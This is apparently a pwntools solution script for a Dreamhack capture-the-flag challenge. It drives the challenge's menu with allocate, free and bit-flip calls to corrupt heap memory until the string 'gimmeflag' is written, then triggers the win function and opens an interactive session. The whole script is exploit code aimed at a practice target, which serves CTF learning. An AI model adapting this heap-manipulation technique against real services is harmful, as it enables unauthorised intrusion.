from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 13063
r = remote(HOST, PORT)

def alloc(idx):
    r.sendlineafter(b'> ', b'0')
    r.sendlineafter(b'> ', b'%d'%idx)

def free(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', b'%d'%idx)

def flip(idx, sz):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'%d'%idx)
    r.sendlineafter(b'> ', b'%d'%sz)

def win(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'%d'%idx)

target = b'gimmeflag'

for i in range(145):
    alloc(i)
    free(0)
alloc(0)

i = 0
idx = 0

for idx in range(len(target)*8):
    flip(i, idx)
    i += 1
    res = int(r.recvline().strip().decode())
    correct_bit = (target[idx // 8] >> (idx%8)) & 1
    if res == correct_bit:
        flip(i, idx)
        i += 1

win(0)

r.interactive()